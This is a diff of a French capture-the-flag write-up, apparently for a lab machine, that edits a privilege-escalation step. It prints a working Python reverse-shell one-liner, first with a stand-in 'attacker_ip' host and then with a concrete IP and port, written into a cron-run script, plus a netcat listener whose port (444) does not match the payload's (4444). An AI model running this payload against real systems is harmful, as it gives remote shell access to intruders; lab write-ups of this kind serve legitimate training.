@@ -207,7 +207,7 @@ L'objectif est d'obtenir un **reverse shell**.
 Je remplace donc le contenu du fichier par le payload suivant :
 
 ```bash
-echo 'import socket,subprocess,os;s=socket.socket();s.connect(("attacker_ip",attacker_port));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])' > /scripts/test.py
+sudo -u scriptmanager bash -c 'echo "import socket,subprocess,os;s=socket.socket();s.connect((\"10.10.17.252\",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\"/bin/sh\",\"-i\"])" > /scripts/test.py'
 ```
 
 Je lance simultanément un listener Netcat sur ma machine :
@@ -215,8 +215,6 @@ Je lance simultanément un listener Netcat sur ma machine :
 ```bash
 nc -lnvp 444
 ```
-
-[Capture d'écran]
 
 Après quelques instants, le script est exécuté et je reçois une connexion sur mon listener.
 
